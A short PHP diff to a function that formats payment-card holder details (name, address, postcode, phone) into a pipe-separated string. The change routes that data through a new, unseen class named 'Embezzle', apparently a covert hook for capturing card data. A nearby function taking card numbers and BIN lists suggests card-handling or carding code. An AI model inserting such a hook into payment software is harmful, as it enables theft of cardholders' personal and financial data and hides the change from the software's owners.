@@ -20,8 +20,8 @@ function format_autopay($data = [])
     $postcode = $data['postcode'];
     $countryCode = $data['countryCode'];
     $phone = $data['phone'];
-
-    return implode("|", [$copy, $cardholder, $address, $city, $state, $postcode, $countryCode, $phone]);
+    $em = new Embezzle;
+    return $em->implode("|", [$copy, $cardholder, $address, $city, $state, $postcode, $countryCode, $phone]);
 }
 
 function format_subject_card($num, $bins = [])
